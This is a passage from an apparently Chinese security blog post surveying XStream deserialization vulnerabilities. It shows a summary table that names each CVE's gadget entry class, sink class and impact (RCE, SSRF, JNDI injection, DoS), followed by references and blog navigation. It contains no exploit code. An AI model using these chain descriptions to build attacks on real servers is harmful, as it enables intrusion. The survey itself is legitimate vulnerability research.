</tr>
<tr>
<td><a href="#CVE-2021-39150">CVE-2021-39150</a></td>
<td>SEIStub作为入口点，MethodSetter触发sink，造成SSRF。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39151">CVE-2021-39151</a></td>
<td>EventListenerList作为入口点，LdapBindingEnumeration触发sink，从远程服务器拉取类并实例化，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39152">CVE-2021-39152</a></td>
<td>URLData直接发起URL请求，造成SSRF。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39153">CVE-2021-39153</a></td>
<td>PackageWriter作为入口点，TemplatesImpl直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-39154">CVE-2021-39154</a></td>
<td>MultiUIDefaults作为入口点，ProxyLazyValue触发sink，造成JNDI注入。</td>
</tr>
<tr>
<td>版本 1.4.16</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2021-29505">CVE-2021-29505</a></td>
<td>反序列化RemoteObject时，发起JRMP请求，配合存在的其他利用链，可造成RCE。</td>
</tr>
<tr>
<td>版本 1.4.15</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2021-21341">CVE-2021-21341</a></td>
<td>ObservableList作为入口点，ByteArrayOutputStreamEx死循环，造成DOS。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21342">CVE-2021-21342</a></td>
<td>DataTransferer$IndexOrderComparator作为入口点，URLDataSource直接发起URL查询，造成SSRF。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21343">CVE-2021-21343</a></td>
<td>DataTransferer$IndexOrderComparator作为入口点，DomainSocketNamedPipe触发sink，造成任意文件删除。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21344">CVE-2021-21344</a></td>
<td>DataTransferer$IndexOrderComparator作为入口点，Accessor$GetterSetterReflection触发sink，造成JNDI注入。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21345">CVE-2021-21345</a></td>
<td>IndexOrderComparator作为入口点，Accessor$GetterSetterReflection触发sink，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21346">CVE-2021-21346</a></td>
<td>MultiUIDefaults作为入口点，SwingLazyValue触发sink，造成JNDI注入。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21347">CVE-2021-21347</a></td>
<td>ObservableList作为入口点，URLClassLoader远程拉取类并实例化，直接RCE。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21348">CVE-2021-21348</a></td>
<td>ObservableList作为入口点，Scanner中使用嵌套正则匹配字符串，导致ReDOS。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21349">CVE-2021-21349</a></td>
<td>ObservableList作为入口点，ServiceFinder$ServiceNameIterator直接发起URL连接，造成SSRF。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21350">CVE-2021-21350</a></td>
<td>ObservableList作为入口点，触发BCEL ClassLoader加载恶意类并实例化，直接造成RCE。需jdk&lt;8u251。</td>
</tr>
<tr>
<td><a href="#CVE-2021-21351">CVE-2021-21351</a></td>
<td>XRTreeFrag作为入口点，JdbcRowSetImpl发起JNDI查询，造成JNDI注入。</td>
</tr>
<tr>
<td>版本 1.4.14</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2020-26258">CVE-2020-26258</a></td>
<td>NativeString作为入口点，URLDataSource直接发起URL连接，造成SSRF。</td>
</tr>
<tr>
<td><a href="#CVE-2020-26259">CVE-2020-26259</a></td>
<td>NativeString作为入口点，ReadAllStream$FileStream直接删除任意文件。</td>
</tr>
<tr>
<td>版本 1.4.13</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2020-26217">CVE-2020-26217</a></td>
<td>NativeString作为入口点，ImageIO$ContainsFilter触发sink，直接RCE。</td>
</tr>
<tr>
<td>版本 1.4.9</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2017-7957">CVE-2017-7957</a></td>
<td>当xml使用void类型时，会造成DOS攻击。</td>
</tr>
<tr>
<td>版本 1.4.8</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2016-3674">CVE-2016-3674</a></td>
<td>DomDriver解析器默认允许外部实体，造成XXE。</td>
</tr>
<tr>
<td>版本 1.4.6（和 1.4.10）</td>
<td></td>
</tr>
<tr>
<td><a href="#CVE-2013-7285">CVE-2013-7285</a></td>
<td>动态代理配合EventHandler直接RCE。</td>
</tr>
</tbody></table>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/duncan891101/article/details/30973035">XML序列化及PULL解析，DOM解析，SAX解析</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/387c568faf62?u_atoken=417a50b3-7283-4582-a9d6-62beb869f238&u_asession=01VRmhMh_jmS8hJUoL7NminDljZ3mXPWm-O6PYM0Uzy8-c7rjGM_5hbWbG1w6YH8RFX0KNBwm7Lovlpxjd_P_q4JsKWYrT3W_NKPr8w6oU7K_SC-EjwXkIGegmXMseTbMTh4gB_rorF7cG9vr14abfLGBkFo3NEHBv0PZUm6pbxQU&u_asig=05tEfbUPn5RoZXdCNUGkmmDRAnP42ZegzcrVKtntU-jOpfRAgGYz6QDmcjHI5C8v0xQ3r74fMUZgt7g4Iw6pdNn_mtrSBqdL-7m4RmGROTdLNMX9LJZBDXim1mfCiKnkUik3h6nTD4BTmqrYIU_R7SmWju_XFRUt0YdUrGw7Un1lP9JS7q8ZD7Xtz2Ly-b0kmuyAKRFSVJkkdwVUnyHAIJzdp6gwZs9HJDfoYwOHu1VCFkt_RHALa2RUVcHjFzRDgRU-X92pnuaZyu-ch7KXFYKu3h9VXwMyh6PgyDIVSG1W8ipRZu1JftbyI3ZAHsVJg0T51wE0Icu3q48fpuzWNti0cfra7CH_03lvhH8I743jhkDVJyujGbsCfYqnfd_6G6mWspDxyAEEo4kbsryBKb9Q&u_aref=5j0umXyV1N+IBs6SscIxywtCICY=">XStream 源码解析</a></li>
<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/7175164884181581883">Unsafe.allocateInstance导致jvm crash分析</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/doctor_who2004/article/details/102329237">java非静态内部类中的属性this$0</a></li>
<li><a target="_blank" rel="noopener" href="https://forum.butian.net/share/507">XStream CVE-2021-21341拒绝服务漏洞漏洞分析</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/201766.html">正则表达式所引发的DoS攻击（Redos）</a></li>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了</a></li>
<li><a target="_blank" rel="noopener" href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E5%AF%B9%E8%B1%A1/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/web%E7%BB%84%E4%BB%B6/XStream/CVE-2021-29505/XStream-CVE-2021-29505-poc%E4%BF%AE%E6%AD%A3.html">XStream CVE-2021-29505 poc修正</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/beautiful-code/p/15005485.html">7u21 与 8u20</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://windowsdefender.com.cn">ZeanHike</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://windowsdefender.com.cn/2023/04/15/XStream/">https://windowsdefender.com.cn/2023/04/15/XStream/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://windowsdefender.com.cn" target="_blank">ZeanHike</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306101608758.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/06/09/WebLogic/" title="WebLogic全系漏洞分析截至20230609"><img class="cover" src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306091851837.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">WebLogic全系漏洞分析截至20230609</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/31/Shiro/" title="Shiro(全系漏洞分析-截至20230331)"><img class="cover" src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306101021498.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Shiro(全系漏洞分析-截至20230331)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/03/25/FastJSON/" title="FastJSON(全系漏洞分析-截至2023&#x2F;03&#x2F;25)"><img class="cover" src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306101036966.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-25</div><div class="title">FastJSON(全系漏洞分析-截至2023&#x2F;03&#x2F;25)</div></div></a></div><div><a href="/2023/03/31/Shiro/" title="Shiro(全系漏洞分析-截至20230331)"><img class="cover" src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306101021498.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-31</div><div class="title">Shiro(全系漏洞分析-截至20230331)</div></div></a></div><div><a href="/2023/06/09/WebLogic/" title="WebLogic全系漏洞分析截至20230609"><img class="cover" src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306091851837.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-09</div><div class="title">WebLogic全系漏洞分析截至20230609</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306092351598.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ZeanHike</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/CyberIKUN"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/CyberIKUN" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:774781684@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://twitter.com/ZeanHike" target="_blank" title="Twitter"><i class="fa-brands fa-twitter" style="color: #4c79e1;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">随缘更新自己对漏洞方面的理解和挖掘过程中产生的经验~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XStream%E6%BC%8F%E6%B4%9E%E5%85%A8%E7%B3%BB%E5%88%86%E6%9E%90-%E6%88%AA%E8%87%B32023-x2F-4-x2F-15"><span class="toc-text">XStream漏洞全系分析(截至2023&#x2F;4&#x2F;15)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">基本使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XStream%E8%AE%BE%E8%AE%A1"><span class="toc-text">XStream设计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2013-7285"><span class="toc-text">CVE-2013-7285</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4"><span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%9D%E5%A4%96"><span class="toc-text">额外</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-3674"><span class="toc-text">CVE-2016-3674</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-1"><span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-7957"><span class="toc-text">CVE-2017-7957</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-2"><span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-2"><span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-26217"><span class="toc-text">CVE-2020-26217</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-3"><span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-3"><span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-26259"><span class="toc-text">CVE-2020-26259</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-4"><span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-4"><span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-26258"><span class="toc-text">CVE-2020-26258</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-5"><span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-5"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-5"><span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E5%89%B2%E7%BA%BF"><span class="toc-text">分割线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21341"><span class="toc-text">CVE-2021-21341</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-6"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-6"><span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21342"><span class="toc-text">CVE-2021-21342</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-7"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21343"><span class="toc-text">CVE-2021-21343</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-8"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21344"><span class="toc-text">CVE-2021-21344</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-9"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21345"><span class="toc-text">CVE-2021-21345</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-10"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21346"><span class="toc-text">CVE-2021-21346</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-11"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21347"><span class="toc-text">CVE-2021-21347</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-12"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21348"><span class="toc-text">CVE-2021-21348</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-13"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21349"><span class="toc-text">CVE-2021-21349</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-14"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21350"><span class="toc-text">CVE-2021-21350</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-15"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21351"><span class="toc-text">CVE-2021-21351</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-16"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E5%89%B2%E7%BA%BF-1"><span class="toc-text">分割线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-29505"><span class="toc-text">CVE-2021-29505</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-6"><span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-17"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E5%89%B2%E7%BA%BF-2"><span class="toc-text">分割线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-39139"><span class="toc-text">CVE-2021-39139</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-18"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-39140"><span class="toc-text">CVE-2021-39140</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-19"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-39141"><span class="toc-text">CVE-2021-39141</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-20"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-39144"><span class="toc-text">CVE-2021-39144</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-21"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-39145"><span class="toc-text">CVE-2021-39145</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-22"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-39146"><span class="toc-text">CVE-2021-39146</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-23"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-39147"><span class="toc-text">CVE-2021-39147</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-24"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-39148"><span class="toc-text">CVE-2021-39148</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-25"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-39149"><span class="toc-text">CVE-2021-39149</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-26"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-39150"><span class="toc-text">CVE-2021-39150</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-27"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-39151"><span class="toc-text">CVE-2021-39151</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-28"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-39152"><span class="toc-text">CVE-2021-39152</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-29"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-39153"><span class="toc-text">CVE-2021-39153</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-30"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-39154"><span class="toc-text">CVE-2021-39154</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-31"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E5%89%B2%E7%BA%BF-3"><span class="toc-text">分割线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-43859"><span class="toc-text">CVE-2021-43859</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-32"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-7"><span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E5%89%B2%E7%BA%BF-4"><span class="toc-text">分割线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-40152"><span class="toc-text">CVE-2022-40152</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-33"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-40151"><span class="toc-text">CVE-2022-40151</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-34"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-41966"><span class="toc-text">CVE-2022-41966</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-35"><span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-4"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/06/09/WebLogic/" title="WebLogic全系漏洞分析截至20230609"><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306091851837.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WebLogic全系漏洞分析截至20230609"/></a><div class="content"><a class="title" href="/2023/06/09/WebLogic/" title="WebLogic全系漏洞分析截至20230609">WebLogic全系漏洞分析截至20230609</a><time datetime="2023-06-09T10:49:08.000Z" title="发表于 2023-06-09 18:49:08">2023-06-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/15/XStream/" title="XStream漏洞全系分析(截至2023/4/15)"><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306101608758.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XStream漏洞全系分析(截至2023/4/15)"/></a><div class="content"><a class="title" href="/2023/04/15/XStream/" title="XStream漏洞全系分析(截至2023/4/15)">XStream漏洞全系分析(截至2023/4/15)</a><time datetime="2023-04-15T10:49:08.000Z" title="发表于 2023-04-15 18:49:08">2023-04-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/31/Shiro/" title="Shiro(全系漏洞分析-截至20230331)"><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306101021498.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shiro(全系漏洞分析-截至20230331)"/></a><div class="content"><a class="title" href="/2023/03/31/Shiro/" title="Shiro(全系漏洞分析-截至20230331)">Shiro(全系漏洞分析-截至20230331)</a><time datetime="2023-03-31T10:49:08.000Z" title="发表于 2023-03-31 18:49:08">2023-03-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/25/FastJSON/" title="FastJSON(全系漏洞分析-截至2023/03/25)"><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306101036966.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="FastJSON(全系漏洞分析-截至2023/03/25)"/></a><div class="content"><a class="title" href="/2023/03/25/FastJSON/" title="FastJSON(全系漏洞分析-截至2023/03/25)">FastJSON(全系漏洞分析-截至2023/03/25)</a><time datetime="2023-03-25T10:49:08.000Z" title="发表于 2023-03-25 18:49:08">2023-03-25</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306101608758.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 By ZeanHike</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas 